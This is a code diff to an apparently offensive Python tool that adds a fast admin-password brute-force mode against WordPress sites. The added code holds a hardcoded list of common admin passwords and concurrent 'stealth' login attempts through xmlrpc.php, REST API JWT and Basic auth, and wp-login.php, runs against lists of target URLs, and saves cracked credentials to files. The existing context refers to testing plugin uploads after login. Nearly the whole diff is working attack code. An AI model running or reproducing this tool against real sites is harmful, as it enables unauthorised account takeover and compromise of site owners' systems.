@@ -20,6 +20,7 @@ from functools import partial
 import zipfile
 import io
 import base64
+import xml.etree.ElementTree as ET
 
 #By Chirag Artani 
 
@@ -72,6 +73,8 @@ def parse_args():
     group.add_argument('-l', '--url-list', help='File containing list of target URLs (one per line)')
     parser.add_argument('-o', '--output', help='Output file for successful logins', default='wp_successful_logins.txt')
     parser.add_argument('--upload-output', help='Output file for plugin upload successes', default='wp_plugin_uploads.txt')
+    parser.add_argument('--mode', type=int, choices=[1, 2], default=2, help='Brute force mode: 1=Fast admin-only brute force, 2=Full enumeration + brute force (default: 2)')
+    parser.add_argument('--default-output', help='Output file for default brute force results', default='default-bruteforce-output.txt')
     parser.add_argument('-w', '--workers', type=int, default=20, help='Number of concurrent workers per target (default: 20)')
     parser.add_argument('-s', '--site-workers', type=int, default=10, help='Number of concurrent sites to scan (default: 10)')
     parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
@@ -187,6 +190,425 @@ def write_plugin_upload_success(upload_output_file, url, username, password, upl
     timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
     with open(upload_output_file, 'a') as f:
         f.write(f"[{timestamp}] {url} - {username}:{password} - {upload_method} - {plugin_url}\n")
+
+def write_default_bruteforce_success(output_file, url, username, password, method):
+    """Write successful default brute force login to file with timestamp"""
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    with open(output_file, 'a') as f:
+        f.write(f"[{timestamp}] {url} - {username}:{password} - {method}\n")
+
+def get_admin_password_list():
+    """Get the specific password list for admin user brute force"""
+    return [
+        'admin123', 'Aa123456', 'Avfr4bgt5', 'admin12345', 'P@ssw0rd', 
+        'admin', 'admin888', 'Passw0rd', '123456', '12345678', 
+        'password', '88888888', 'Qq123456', 'Admin888', 'Admin123'
+    ]
+
+async def async_xmlrpc_login(url, username, password, timeout, session):
+    """Try XML-RPC login method using asyncio"""
+    try:
+        # Try different XML-RPC endpoints
+        xmlrpc_urls = [
+            f"{url}/xmlrpc.php",
+            f"{url}/wordpress/xmlrpc.php", 
+            f"{url}/wp/xmlrpc.php",
+            f"{url}/blog/xmlrpc.php"
+        ]
+        
+        # Create XML-RPC request body
+        xml_body = f'''<?xml version="1.0"?>
+<methodCall>
+    <methodName>wp.getUsersBlogs</methodName>
+    <params>
+        <param><value><string>{username}</string></value></param>
+        <param><value><string>{password}</string></value></param>
+    </params>
+</methodCall>'''
+        
+        headers = {
+            'User-Agent': get_random_user_agent(),
+            'Content-Type': 'text/xml',
+            'Content-Length': str(len(xml_body))
+        }
+        
+        for xmlrpc_url in xmlrpc_urls:
+            try:
+                async with session.post(xmlrpc_url, data=xml_body, headers=headers, 
+                                      timeout=timeout, ssl=False) as response:
+                    if response.status == 200:
+                        response_text = await response.text()
+                        # Check if login was successful (no fault in response)
+                        if '<fault>' not in response_text and '<methodResponse>' in response_text:
+                            return True, "XML-RPC"
+            except Exception:
+                continue
+                
+    except Exception:
+        pass
+        
+    return False, "XML-RPC"
+
+def xmlrpc_login(url, username, password, timeout):
+    """Try XML-RPC login method"""
+    try:
+        # Try different XML-RPC endpoints
+        xmlrpc_urls = [
+            f"{url}/xmlrpc.php",
+            f"{url}/wordpress/xmlrpc.php", 
+            f"{url}/wp/xmlrpc.php",
+            f"{url}/blog/xmlrpc.php"
+        ]
+        
+        # Create XML-RPC request body
+        xml_body = f'''<?xml version="1.0"?>
+<methodCall>
+    <methodName>wp.getUsersBlogs</methodName>
+    <params>
+        <param><value><string>{username}</string></value></param>
+        <param><value><string>{password}</string></value></param>
+    </params>
+</methodCall>'''
+        
+        headers = {
+            'User-Agent': get_random_user_agent(),
+            'Content-Type': 'text/xml',
+            'Content-Length': str(len(xml_body))
+        }
+        
+        for xmlrpc_url in xmlrpc_urls:
+            try:
+                response = requests.post(xmlrpc_url, data=xml_body, headers=headers, 
+                                       timeout=timeout, verify=False)
+                if response.status_code == 200:
+                    # Check if login was successful (no fault in response)
+                    if '<fault>' not in response.text and '<methodResponse>' in response.text:
+                        return True, "XML-RPC"
+            except Exception:
+                continue
+                
+    except Exception:
+        pass
+        
+    return False, "XML-RPC"
+
+async def async_rest_api_login(url, username, password, timeout, session):
+    """Try REST API login method using asyncio"""
+    try:
+        # Try JWT authentication endpoint (common plugin)
+        jwt_url = f"{url}/wp-json/jwt-auth/v1/token"
+        
+        headers = {
+            'User-Agent': get_random_user_agent(),
+            'Content-Type': 'application/json'
+        }
+        
+        login_data = {
+            'username': username,
+            'password': password
+        }
+        
+        try:
+            async with session.post(jwt_url, json=login_data, headers=headers,
+                                  timeout=timeout, ssl=False) as response:
+                if response.status == 200:
+                    response_text = await response.text()
+                    try:
+                        resp_json = json.loads(response_text)
+                        if 'token' in resp_json:
+                            return True, "REST API JWT"
+                    except:
+                        pass
+        except Exception:
+            pass
+            
+        # Try basic REST API with authentication
+        users_url = f"{url}/wp-json/wp/v2/users/me"
+        
+        # Create basic auth header
+        import base64
+        credentials = base64.b64encode(f"{username}:{password}".encode()).decode()
+        headers = {
+            'User-Agent': get_random_user_agent(),
+            'Authorization': f'Basic {credentials}'
+        }
+        
+        try:
+            async with session.get(users_url, headers=headers, timeout=timeout, ssl=False) as response:
+                if response.status == 200:
+                    response_text = await response.text()
+                    try:
+                        resp_json = json.loads(response_text)
+                        if 'id' in resp_json and resp_json.get('username') == username:
+                            return True, "REST API Basic"
+                    except:
+                        pass
+        except Exception:
+            pass
+            
+    except Exception:
+        pass
+        
+    return False, "REST API"
+
+def rest_api_login(url, username, password, timeout):
+    """Try REST API login method"""
+    try:
+        # Try JWT authentication endpoint (common plugin)
+        jwt_url = f"{url}/wp-json/jwt-auth/v1/token"
+        
+        headers = {
+            'User-Agent': get_random_user_agent(),
+            'Content-Type': 'application/json'
+        }
+        
+        login_data = {
+            'username': username,
+            'password': password
+        }
+        
+        try:
+            response = requests.post(jwt_url, json=login_data, headers=headers,
+                                   timeout=timeout, verify=False)
+            if response.status_code == 200:
+                try:
+                    resp_json = response.json()
+                    if 'token' in resp_json:
+                        return True, "REST API JWT"
+                except:
+                    pass
+        except Exception:
+            pass
+            
+        # Try basic REST API with authentication
+        users_url = f"{url}/wp-json/wp/v2/users/me"
+        
+        # Create basic auth header
+        credentials = base64.b64encode(f"{username}:{password}".encode()).decode()
+        headers = {
+            'User-Agent': get_random_user_agent(),
+            'Authorization': f'Basic {credentials}'
+        }
+        
+        try:
+            response = requests.get(users_url, headers=headers, timeout=timeout, verify=False)
+            if response.status_code == 200:
+                try:
+                    resp_json = response.json()
+                    if 'id' in resp_json and resp_json.get('username') == username:
+                        return True, "REST API Basic"
+                except:
+                    pass
+        except Exception:
+            pass
+            
+    except Exception:
+        pass
+        
+    return False, "REST API"
+
+async def async_stealth_login(url, username, password, timeout, session):
+    """Try multiple stealth login methods using asyncio"""
+    methods = [
+        async_xmlrpc_login,
+        async_rest_api_login,
+        lambda u, un, pw, t, s: async_try_login(u, '/wp-login.php', un, pw, t, s)
+    ]
+    
+    for method in methods:
+        try:
+            if method == methods[-1]:  # Regular login method
+                result = await method(url, username, password, timeout, session)
+                if result:
+                    return True, "Standard Login"
+            else:  # Stealth methods
+                result, method_name = await method(url, username, password, timeout, session)
+                if result:
+                    return True, method_name
+        except Exception:
+            continue
+            
+    return False, "None"
+
+def stealth_login(url, username, password, timeout):
+    """Try multiple stealth login methods"""
+    methods = [
+        xmlrpc_login,
+        rest_api_login,
+        lambda u, un, pw, t: try_login(u, '/wp-login.php', un, pw, t)
+    ]
+    
+    for method in methods:
+        try:
+            if method == methods[-1]:  # Regular login method
+                result = method(url, username, password, timeout)
+                if result:
+                    return True, "Standard Login"
+            else:  # Stealth methods
+                result, method_name = method(url, username, password, timeout)
+                if result:
+                    return True, method_name
+        except Exception:
+            continue
+            
+    return False, "None"
+
+async def async_fast_admin_bruteforce(url, timeout, workers, verbose, output_file, delay=0):
+    """Fast admin-only brute force using stealth methods with asyncio"""
+    print_status(f"Starting fast admin brute force on {url} with {workers} workers")
+    
+    username = "admin"
+    passwords = get_admin_password_list()
+    successful_logins = []
+    total_attempts = 0
+    
+    # Create a connection pool for better performance
+    connector = aiohttp.TCPConnector(limit=workers, ssl=False)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        
+        print_status(f"Trying {len(passwords)} passwords for admin user on {url}")
+        
+        # Create tasks for all password attempts
+        login_tasks = []
+        for password in passwords:
+            task = asyncio.create_task(
+                async_stealth_login(url, username, password, timeout, session)
+            )
+            login_tasks.append((task, password))
+            
+            # Add delay if specified
+            if delay > 0:
+                await asyncio.sleep(delay)
+                
+        # Process login attempts
+        for task, password in login_tasks:
+            total_attempts += 1
+            
+            try:
+                result, method = await task
+                if result:
+                    credential = f"{username}:{password}"
+                    successful_logins.append(credential)
+                    print_status(f"✓ ADMIN SUCCESS: {url} - {credential} - Method: {method}", "success")
+                    
+                    # Write to file immediately
+                    write_default_bruteforce_success(output_file, url, username, password, method)
+                    
+                    # Cancel remaining tasks since we found valid credentials
+                    for remaining_task, _ in login_tasks:
+                        if not remaining_task.done():
+                            remaining_task.cancel()
+                            
+                    break
+                elif verbose:
+                    print_status(f"✗ Failed: {url} - {username}:{password}", "warning")
+            except asyncio.CancelledError:
+                # Task was cancelled, just continue
+                pass
+            except Exception as e:
+                if verbose:
+                    print_status(f"Error trying {url} - {username}:{password}: {str(e)}", "error")
+    
+    print_status(f"Fast admin brute force completed on {url}. {total_attempts} attempts. {len(successful_logins)} successful logins.", "info")
+    return successful_logins
+
+def fast_admin_bruteforce(url, timeout, workers, verbose, output_file, delay=0):
+    """Fast admin-only brute force using stealth methods"""
+    print_status(f"Starting fast admin brute force on {url} with {workers} workers")
+    
+    username = "admin"
+    passwords = get_admin_password_list()
+    successful_logins = []
+    total_attempts = 0
+    
+    print_status(f"Trying {len(passwords)} passwords for admin user on {url}")
+    
+    # Use ThreadPoolExecutor for concurrent login attempts
+    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
+        futures = {}
+        for password in passwords:
+            future = executor.submit(stealth_login, url, username, password, timeout)
+            futures[future] = password
+            
+        # Process futures as they complete
+        for future in concurrent.futures.as_completed(futures):
+            password = futures[future]
+            total_attempts += 1
+            
+            try:
+                result, method = future.result()
+                if result:
+                    credential = f"{username}:{password}"
+                    successful_logins.append(credential)
+                    print_status(f"✓ ADMIN SUCCESS: {url} - {credential} - Method: {method}", "success")
+                    
+                    # Write to file immediately
+                    write_default_bruteforce_success(output_file, url, username, password, method)
+                    
+                    # Cancel remaining futures since we found valid credentials
+                    for f in futures:
+                        if not f.done():
+                            f.cancel()
+                            
+                    break
+                elif verbose:
+                    print_status(f"✗ Failed: {url} - {username}:{password}", "warning")
+            except Exception as e:
+                if verbose:
+                    print_status(f"Error trying {url} - {username}:{password}: {str(e)}", "error")
+            
+            # Add delay if specified
+            if delay > 0:
+                time.sleep(delay)
+
+    print_status(f"Fast admin brute force completed on {url}. {total_attempts} attempts. {len(successful_logins)} successful logins.", "info")
+    return successful_logins
+
+async def async_process_single_site_mode1(url, args):
+    """Process a single WordPress site using mode 1 (fast admin brute force) with asyncio"""
+    normalized_url = normalize_url(url)
+    
+    try:
+        results = await async_fast_admin_bruteforce(
+            normalized_url, args.timeout, args.workers, 
+            args.verbose, args.default_output, args.delay
+        )
+        return results
+        
+    except Exception as e:
+        print_status(f"Error processing {normalized_url}: {str(e)}", "error")
+        if args.verbose:
+            import traceback
+            traceback.print_exc()
+        
+        # Wait after failure to avoid rate limiting
+        print_status(f"Waiting {args.fail_timeout} seconds before continuing...", "warning")
+        await asyncio.sleep(args.fail_timeout)
+        
+        return []
+
+def process_single_site_mode1(url, args):
+    """Process a single WordPress site using mode 1 (fast admin brute force)"""
+    normalized_url = normalize_url(url)
+    
+    try:
+        results = fast_admin_bruteforce(
+            normalized_url, args.timeout, args.workers, 
+            args.verbose, args.default_output, args.delay
+        )
+        return results
+        
+    except Exception as e:
+        print_status(f"Error processing {normalized_url}: {str(e)}", "error")
+        if args.verbose:
+            import traceback
+            traceback.print_exc()
+        
+        # Wait after failure to avoid rate limiting
+        print_status(f"Waiting {args.fail_timeout} seconds before continuing...", "warning")
+        time.sleep(args.fail_timeout)
+        
+        return []
 
 async def async_test_plugin_upload(url, login_path, username, password, timeout, session, upload_output_file):
     """Test plugin upload capabilities using multiple methods with asyncio"""
@@ -1443,19 +1865,29 @@ async def async_process_url_list(url_list_file, args):
 
     print_status(f"Loaded {len(urls_to_process)} URLs to process from {url_list_file}")
     print_status(f"Already completed: {len(state['targets_completed'])} URLs")
-
-    # Create output file with header if not resuming
-    if not args.resume or not os.path.exists(args.output):
-        with open(args.output, 'w') as f:
-            f.write(f"# WordPress Successful Logins - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-            f.write("# Format: [Timestamp] URL - username:password\n")
-            f.write("# Format: [Timestamp] URL - username:password - Plugin Access: plugins.php, plugin-install.php, ...\n\n")
     
-    # Create plugin upload output file with header if not resuming
-    if not args.resume or not os.path.exists(args.upload_output):
-        with open(args.upload_output, 'w') as f:
-            f.write(f"# WordPress Plugin Upload Successes - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-            f.write("# Format: [Timestamp] URL - username:password - Upload Method - Plugin URL\n\n")
+    # Create output files with header based on mode
+    if args.mode == 1:
+        # Mode 1: Initialize default brute force output
+        if not os.path.exists(args.default_output):
+            with open(args.default_output, 'w') as f:
+                f.write(f"# WordPress Admin Brute Force Results - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write("# Format: [Timestamp] URL - username:password - Method\n\n")
+        print_status(f"Running Mode 1: Fast admin brute force on {len(urls_to_process)} URLs", "info")
+    else:
+        # Mode 2: Initialize full enumeration output files
+        if not args.resume or not os.path.exists(args.output):
+            with open(args.output, 'w') as f:
+                f.write(f"# WordPress Successful Logins - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write("# Format: [Timestamp] URL - username:password\n")
+                f.write("# Format: [Timestamp] URL - username:password - Plugin Access: plugins.php, plugin-install.php, ...\n\n")
+        
+        # Create plugin upload output file with header if not resuming
+        if not args.resume or not os.path.exists(args.upload_output):
+            with open(args.upload_output, 'w') as f:
+                f.write(f"# WordPress Plugin Upload Successes - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write("# Format: [Timestamp] URL - username:password - Upload Method - Plugin URL\n\n")
+        print_status(f"Running Mode 2: Full enumeration + brute force on {len(urls_to_process)} URLs", "info")
 
     # Process URLs with limited concurrency
     sem = asyncio.Semaphore(args.site_workers)
@@ -1467,7 +1899,12 @@ async def async_process_url_list(url_list_file, args):
                 save_state(args.state_file, state['targets_completed'], urls_to_process, None, url)
                 
             try:
-                return await async_process_single_site(url, args, state['targets_completed'])
+                if args.mode == 1:
+                    # Mode 1: Fast admin brute force
+                    return await async_process_single_site_mode1(url, args)
+                else:
+                    # Mode 2: Full enumeration + brute force
+                    return await async_process_single_site(url, args, state['targets_completed'])
             except Exception as e:
                 print_status(f"Error processing URL {url}: {str(e)}", "error")
                 return []
@@ -1529,18 +1966,28 @@ def process_url_list(url_list_file, args):
     print_status(f"Loaded {len(urls_to_process)} URLs to process from {url_list_file}")
     print_status(f"Already completed: {len(state['targets_completed'])} URLs")
 
-    # Create output file with header if not resuming
-    if not args.resume or not os.path.exists(args.output):
-        with open(args.output, 'w') as f:
-            f.write(f"# WordPress Successful Logins - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-            f.write("# Format: [Timestamp] URL - username:password\n")
-            f.write("# Format: [Timestamp] URL - username:password - Plugin Access: plugins.php, plugin-install.php, ...\n\n")
-    
-    # Create plugin upload output file with header if not resuming
-    if not args.resume or not os.path.exists(args.upload_output):
-        with open(args.upload_output, 'w') as f:
-            f.write(f"# WordPress Plugin Upload Successes - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-            f.write("# Format: [Timestamp] URL - username:password - Upload Method - Plugin URL\n\n")
+    # Create output files with header based on mode
+    if args.mode == 1:
+        # Mode 1: Initialize default brute force output
+        if not os.path.exists(args.default_output):
+            with open(args.default_output, 'w') as f:
+                f.write(f"# WordPress Admin Brute Force Results - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write("# Format: [Timestamp] URL - username:password - Method\n\n")
+        print_status(f"Running Mode 1: Fast admin brute force on {len(urls_to_process)} URLs", "info")
+    else:
+        # Mode 2: Initialize full enumeration output files
+        if not args.resume or not os.path.exists(args.output):
+            with open(args.output, 'w') as f:
+                f.write(f"# WordPress Successful Logins - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write("# Format: [Timestamp] URL - username:password\n")
+                f.write("# Format: [Timestamp] URL - username:password - Plugin Access: plugins.php, plugin-install.php, ...\n\n")
+        
+        # Create plugin upload output file with header if not resuming
+        if not args.resume or not os.path.exists(args.upload_output):
+            with open(args.upload_output, 'w') as f:
+                f.write(f"# WordPress Plugin Upload Successes - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write("# Format: [Timestamp] URL - username:password - Upload Method - Plugin URL\n\n")
+        print_status(f"Running Mode 2: Full enumeration + brute force on {len(urls_to_process)} URLs", "info")
 
     # Process URLs with ThreadPoolExecutor for concurrency
     all_successful_logins = []
@@ -1556,7 +2003,10 @@ def process_url_list(url_list_file, args):
             if url_queue.empty():
                 break
             url = url_queue.get()
-            future = executor.submit(process_single_site, url, args, state['targets_completed'])
+            if args.mode == 1:
+                future = executor.submit(process_single_site_mode1, url, args)
+            else:
+                future = executor.submit(process_single_site, url, args, state['targets_completed'])
             futures[future] = url
         
         # Process results as they complete and add new tasks
@@ -1576,7 +2026,10 @@ def process_url_list(url_list_file, args):
                     # Add new URL to process if available
                     if not url_queue.empty():
                         new_url = url_queue.get()
-                        new_future = executor.submit(process_single_site, new_url, args, state['targets_completed'])
+                        if args.mode == 1:
+                            new_future = executor.submit(process_single_site_mode1, new_url, args)
+                        else:
+                            new_future = executor.submit(process_single_site, new_url, args, state['targets_completed'])
                         futures[new_future] = new_url
                 except KeyboardInterrupt:
                     print_status("\nOperation interrupted. State saved for resuming later.", "warning")
@@ -1590,7 +2043,10 @@ def process_url_list(url_list_file, args):
                     # Add new URL to process if available
                     if not url_queue.empty():
                         new_url = url_queue.get()
-                        new_future = executor.submit(process_single_site, new_url, args, state['targets_completed'])
+                        if args.mode == 1:
+                            new_future = executor.submit(process_single_site_mode1, new_url, args)
+                        else:
+                            new_future = executor.submit(process_single_site, new_url, args, state['targets_completed'])
                         futures[new_future] = new_url
 
     # Final summary
@@ -1615,34 +2071,57 @@ async def async_main():
             # Single target processing
             normalized_url = normalize_url(args.target)
             
-            # Check if we're resuming
-            targets_completed = set()
-            if args.resume:
-                state = load_state(args.state_file)
-                targets_completed = state['targets_completed']
-            
-            # Initialize output file if not resuming
-            if not args.resume or not os.path.exists(args.output):
-                with open(args.output, 'w') as f:
-                    f.write(f"# WordPress Successful Logins - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-                    f.write("# Format: [Timestamp] URL - username:password\n")
-                    f.write("# Format: [Timestamp] URL - username:password - Plugin Access: plugins.php, plugin-install.php, ...\n\n")
-            
-            # Initialize plugin upload output file
-            if not args.resume or not os.path.exists(args.upload_output):
-                with open(args.upload_output, 'w') as f:
-                    f.write(f"# WordPress Plugin Upload Successes - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-                    f.write("# Format: [Timestamp] URL - username:password - Upload Method - Plugin URL\n\n")
+            if args.mode == 1:
+                # Mode 1: Fast admin-only brute force
+                print_status(f"Running Mode 1: Fast admin brute force on {normalized_url}", "info")
+                
+                # Initialize default brute force output file
+                if not os.path.exists(args.default_output):
+                    with open(args.default_output, 'w') as f:
+                        f.write(f"# WordPress Admin Brute Force Results - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                        f.write("# Format: [Timestamp] URL - username:password - Method\n\n")
+                
+                successful_logins = await async_process_single_site_mode1(args.target, args)
+                
+                if successful_logins:
+                    print_status(f"\n{'='*50}")
+                    print_status(f"SUMMARY - Fast admin brute force results for {normalized_url}:", "success")
+                    for login in successful_logins:
+                        print(f"  {Fore.GREEN}✓{Style.RESET_ALL} {normalized_url} - {login}")
+                    print_status(f"Results saved to {args.default_output}")
+                    print_status(f"{'='*50}")
+            else:
+                # Mode 2: Full enumeration + brute force (existing functionality)
+                print_status(f"Running Mode 2: Full enumeration + brute force on {normalized_url}", "info")
+                
+                # Check if we're resuming
+                targets_completed = set()
+                if args.resume:
+                    state = load_state(args.state_file)
+                    targets_completed = state['targets_completed']
+                
+                # Initialize output file if not resuming
+                if not args.resume or not os.path.exists(args.output):
+                    with open(args.output, 'w') as f:
+                        f.write(f"# WordPress Successful Logins - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                        f.write("# Format: [Timestamp] URL - username:password\n")
+                        f.write("# Format: [Timestamp] URL - username:password - Plugin Access: plugins.php, plugin-install.php, ...\n\n")
+                
+                # Initialize plugin upload output file
+                if not args.resume or not os.path.exists(args.upload_output):
+                    with open(args.upload_output, 'w') as f:
+                        f.write(f"# WordPress Plugin Upload Successes - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                        f.write("# Format: [Timestamp] URL - username:password - Upload Method - Plugin URL\n\n")
 
-            successful_logins = await async_process_single_site(args.target, args, targets_completed)
+                successful_logins = await async_process_single_site(args.target, args, targets_completed)
 
-            if successful_logins and not args.only_enumerate:
-                print_status(f"\n{'='*50}")
-                print_status(f"SUMMARY - Successful logins for {normalized_url}:", "success")
-                for login in successful_logins:
-                    print(f"  {Fore.GREEN}✓{Style.RESET_ALL} {normalized_url} - {login}")
-                print_status(f"Results saved to {args.output}")
-                print_status(f"{'='*50}")
+                if successful_logins and not args.only_enumerate:
+                    print_status(f"\n{'='*50}")
+                    print_status(f"SUMMARY - Successful logins for {normalized_url}:", "success")
+                    for login in successful_logins:
+                        print(f"  {Fore.GREEN}✓{Style.RESET_ALL} {normalized_url} - {login}")
+                    print_status(f"Results saved to {args.output}")
+                    print_status(f"{'='*50}")
 
     except KeyboardInterrupt:
         print_status("\nOperation cancelled by user. Saving state for resuming later.", "warning")
@@ -1676,34 +2155,57 @@ def main():
             # Single target processing
             normalized_url = normalize_url(args.target)
             
-            # Check if we're resuming
-            targets_completed = set()
-            if args.resume:
-                state = load_state(args.state_file)
-                targets_completed = state['targets_completed']
-            
-            # Initialize output file if not resuming
-            if not args.resume or not os.path.exists(args.output):
-                with open(args.output, 'w') as f:
-                    f.write(f"# WordPress Successful Logins - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-                    f.write("# Format: [Timestamp] URL - username:password\n")
-                    f.write("# Format: [Timestamp] URL - username:password - Plugin Access: plugins.php, plugin-install.php, ...\n\n")
-            
-            # Initialize plugin upload output file
-            if not args.resume or not os.path.exists(args.upload_output):
-                with open(args.upload_output, 'w') as f:
-                    f.write(f"# WordPress Plugin Upload Successes - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-                    f.write("# Format: [Timestamp] URL - username:password - Upload Method - Plugin URL\n\n")
+            if args.mode == 1:
+                # Mode 1: Fast admin-only brute force
+                print_status(f"Running Mode 1: Fast admin brute force on {normalized_url}", "info")
+                
+                # Initialize default brute force output file
+                if not os.path.exists(args.default_output):
+                    with open(args.default_output, 'w') as f:
+                        f.write(f"# WordPress Admin Brute Force Results - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                        f.write("# Format: [Timestamp] URL - username:password - Method\n\n")
+                
+                successful_logins = process_single_site_mode1(args.target, args)
+                
+                if successful_logins:
+                    print_status(f"\n{'='*50}")
+                    print_status(f"SUMMARY - Fast admin brute force results for {normalized_url}:", "success")
+                    for login in successful_logins:
+                        print(f"  {Fore.GREEN}✓{Style.RESET_ALL} {normalized_url} - {login}")
+                    print_status(f"Results saved to {args.default_output}")
+                    print_status(f"{'='*50}")
+            else:
+                # Mode 2: Full enumeration + brute force (existing functionality)
+                print_status(f"Running Mode 2: Full enumeration + brute force on {normalized_url}", "info")
+                
+                # Check if we're resuming
+                targets_completed = set()
+                if args.resume:
+                    state = load_state(args.state_file)
+                    targets_completed = state['targets_completed']
+                
+                # Initialize output file if not resuming
+                if not args.resume or not os.path.exists(args.output):
+                    with open(args.output, 'w') as f:
+                        f.write(f"# WordPress Successful Logins - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                        f.write("# Format: [Timestamp] URL - username:password\n")
+                        f.write("# Format: [Timestamp] URL - username:password - Plugin Access: plugins.php, plugin-install.php, ...\n\n")
+                
+                # Initialize plugin upload output file
+                if not args.resume or not os.path.exists(args.upload_output):
+                    with open(args.upload_output, 'w') as f:
+                        f.write(f"# WordPress Plugin Upload Successes - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                        f.write("# Format: [Timestamp] URL - username:password - Upload Method - Plugin URL\n\n")
 
-            successful_logins = process_single_site(args.target, args, targets_completed)
+                successful_logins = process_single_site(args.target, args, targets_completed)
 
-            if successful_logins and not args.only_enumerate:
-                print_status(f"\n{'='*50}")
-                print_status(f"SUMMARY - Successful logins for {normalized_url}:", "success")
-                for login in successful_logins:
-                    print(f"  {Fore.GREEN}✓{Style.RESET_ALL} {normalized_url} - {login}")
-                print_status(f"Results saved to {args.output}")
-                print_status(f"{'='*50}")
+                if successful_logins and not args.only_enumerate:
+                    print_status(f"\n{'='*50}")
+                    print_status(f"SUMMARY - Successful logins for {normalized_url}:", "success")
+                    for login in successful_logins:
+                        print(f"  {Fore.GREEN}✓{Style.RESET_ALL} {normalized_url} - {login}")
+                    print_status(f"Results saved to {args.output}")
+                    print_status(f"{'='*50}")
 
     except KeyboardInterrupt:
         print_status("\nOperation cancelled by user. Saving state for resuming later.", "warning")
